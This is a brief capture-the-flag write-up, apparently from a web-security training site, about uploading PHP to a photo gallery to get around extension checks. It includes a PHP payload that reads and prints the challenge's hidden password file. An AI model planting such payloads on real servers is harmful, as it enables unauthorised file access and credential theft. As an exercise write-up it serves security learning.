# Description
```
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.
```

# Exploit
- When checking the upload feature, we notice that PHP extension is not allowed by the server’s validation rules.

- To bypass this restriction, we create a simple PHP payload that reads the password file

```php
<?php $ressource = fopen('/challenge/web-serveur/ch20/.passwd', 'rb');
    echo 'Mot de passe : ' .fgets($ressource, 30)?>
```